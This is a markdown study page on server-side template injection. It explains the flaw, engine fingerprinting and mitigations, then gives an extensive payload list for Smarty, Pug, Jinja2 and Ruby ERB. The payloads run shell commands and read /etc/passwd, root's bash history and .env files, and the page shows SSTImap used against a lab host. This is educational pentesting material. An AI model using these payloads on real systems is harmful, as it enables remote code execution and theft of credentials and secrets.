---
title: SSTI
description: Server-side template injection. Exploit various templating engines that lead to SSTI vulnerability.
---
Server-Side Template Injection (SSTI) occurs when user input is unsafely embedded into a server-side template. This allows an attacker to inject and execute arbitrary code on the server.

Modern web applications use template engines to generate dynamic HTML by combining static templates with dynamic data. These templates include placeholders that are replaced with user-provided values.

If user input isn’t properly sanitised, the template engine might interpret it as code instead of plain text—leading to potential code execution when the template is rendered.

## SSTI Context
### Plaintext Context
**SSTI** happens when template engines **auto-evaluate variables or expressions inside strings** (you’re not inside `{{ ... }}`)

Code:
```python
render("Hello " + username)
```
User input:
```python
username=${7*7}
```
Output:
```python
Hello 49
```
### Code Context
**Code context SSTI** happens when attacker input is **already inside or injected into a template expression** (e.g. `{{ input }}`), giving you direct access to logic execution.

Code:
```python
render("Hello {{ " + greeting + " }}")
```

User input:
```python
greeting=data.username}}<script>alert(1)</script>
```
Output:
```python
Hello Carlos<script>alert(1)</script>

```
## Impact
- Reading and modifying server files
- Executing system commands
- Accessing sensitive information
## Template Engines
Common template engines:
- **Jinja2**: popular with python applications
- **Twig**: default template engine for Symfony in PHP
- **Pug/Jade**: popular with Node.js

### Parsing
Template engines parse files with both static and dynamic content. At runtime, they replace dynamic parts with provided data to generate the final output.

The code below shows how to use a Jinja2 template. `{{ name }}` is a placeholder that gets replaced with the provided value `"World"` during rendering, resulting in the output `Hello, World!`.
```python
from jinja2 import Template

hello_template = Template("Hello, {{ name }}!")
output = hello_template.render(name="World")
print(output)
```
### Determining the Template Engine
- **Jinja2**: `{{7*'7'}}` → `7777777`
- **Twig**: `{{7*'7'}}` → `49`
- **Jade/Pug**: `#{7*'7'}` → `49`
### Pug
Pug lets you execute JavaScript directly:
```js
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
```
- `root`: global object
- `process`: Node.js global object
- `mainModule`: property of `process`
- `require`: function that loads modules like `fs`, `child_process` etc.
- `child_process`: Node.js module to run system commands (`ls`, `cat`)
- `spawnSync`: method of `child_process`, to run command synchronously
	- `stdout`: standard output (what the command prints)
    - `stderr`: errors, if any
    - `status`: exit code
#### How to use `spawnSync`
```javascript
spawnSync(command, [args], [options])
```
- **`command`**: The system command you want to run (like `"ls"` or `"ping"`).
- **`args`** _(optional)_: A list of extra words to pass to the command (like `["-l", "/"]`).
- **`options`** _(optional)_: Settings like where to run it from, environment variables, or how long to wait.

```js
spawnSync("ls", ["-l", "/"])
```

Runs:
```bash
ls -l /
```

### Jinja2
```python
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}
```
- `"".__class__.__mro__[1]`: accesses the base `object` class, the superclass of all Python classes.
- `.__subclasses__()`: Gets a list of all classes that directly inherit from `object`. This list includes built-in Python classes like `file`, `function`, `type`,
- `[157]` is typically the index for the `subprocess.Popen` class
-  `.__repr__.__globals__`: Accesses the `__globals__` dictionary of the `__repr__` method from that subclass, exposing the global scope.
- `.get("__builtins__")`: Gets the built-in functions and objects (like `open`, `eval`, `__import__`, etc.)
- `.get("__import__")` : Fetches Python’s built-in `__import__()` function, which allows importing any module
- `("subprocess")`: Uses `__import__` to import the `subprocess` module.
- `.check_output("ls")` : Runs the `ls` command and returns its output.

#### How to use `check_output`
```python
subprocess.check_output([command, arg1, arg2])
```

- **command**: A string that specifies the command to execute.
- **arg1, arg2, ...**: Additional arguments that should be passed to the command.
```python
subprocess.check_output(['ls', '-lah'])
```

## Mitigation
- **Sandboxing** is a security feature that restricts the execution of potentially harmful code within templates.
- **Input Sanitisation**: Escape or remove dangerous characters and strings that can be interpreted as code. 
### Jinja2
- **Sandbox mode**: Restrict template from accessing unsafe functions and atttributes
### Jade  (Pug)
- **Avoid Direct JavaScript Evaluation**: Avoid using Pug’s ability to evaluate JavaScript code within templates
### Smarty
- **Disable `{php}` Tags**: Ensure that `{php}` tags are disabled in Smarty configurations
- **Use Secure Handlers**:  If you must allow users to customise templates, provide a secure set of tags or modifiers that they can use

## Exploit

### PHP - Smarty

**Identify**
```php
{'Hello'|upper}  
{$smarty.version}
{system("ls")} 
{passthru('id')}
{shell_exec('id')}
{exec('id')}
```

**Read files**
```php
{system("cat file.txt")
{system('/bin/cat /etc/passwd')}
{system('/bin/cat /root/.bash_history')}
{system('/bin/cat /var/www/html/.env')}
```
### Node.js - Pug
**Identify**
```js
#{7*7}  
```

**Read files**
```js
#{root.process.mainModule.require('child_process').spawnSync('ls').stdout}
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}

```

**RCE**
```js
#{root.process.mainModule.require('child_process').spawnSync('cat', ['flag.txt']).stdout}
```

### Python - Jinja2

**Basic Test**

```python
{{7*7}}    
```

**RCE**
```python
{{ [].__class__.__base__.__subclasses__() }}
{{ __import__('os').popen('id').read() }}
{{ __import__('os').popen('ls').read() }}
```
**RCE using globals and init method**
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}

```

**RCE using mro and base:**
```python
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ [].class.__base__.subclasses() }}
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['cat', 'flag.txt'])}

```

### Ruby ERB

**Identify**
```ruby
<%= 7 * 7 %>
```

**Read files**
```ruby
<%= File.open('/etc/passwd').read %>
<%= Dir.entries('/') %>
```

**RCE**
```ruby
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines() %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline() %>
```
## Tool
https://github.com/vladko312/SSTImap

### Installation
```bash
git clone https://github.com/vladko312/SSTImap.git
```

```bash
pip3 install -r requirements.txt --break-system-packages
```

### Usage
```bash
sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='
```

Result:
```bash
sstimap -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='                       

    ╔══════╦══════╦═══════╗ ▀█▀
    ║ ╔════╣ ╔════╩══╗ ╔══╝═╗▀╔═
    ║ ╚════╣ ╚════╗  ║ ║    ║{║  _ __ ___   __ _ _ __
    ╚════╗ ╠════╗ ║  ║ ║    ║*║ | '_ ` _ \ / _` | '_ \
    ╔════╝ ╠════╝ ║  ║ ║    ║}║ | | | | | | (_| | |_) |
    ╚══════╩══════╝  ╚═╝    ╚╦╝ |_| |_| |_|\__,_| .__/
                             │                  | |
                                                |_|
[*] Version: 1.2.4
[*] Author: @vladko312
[*] Based on Tplmap

[+] Mako plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: page
  Engine: Mako
  Injection: *
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

	Shell command execution: ok
	Bind and reverse shell: ok
	File write: ok
	File read: ok
	Code evaluation: ok, python code

```

- `-u` : URL
- `-d`: request body data param
## References
- [SecurityBoat SSTI Handbook](https://workbook.securityboat.net/attachments/sb_handbooks/SSTI-Handbook.pdf)
- [Hacktricks SSTI (Server Side Template Injection)](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection)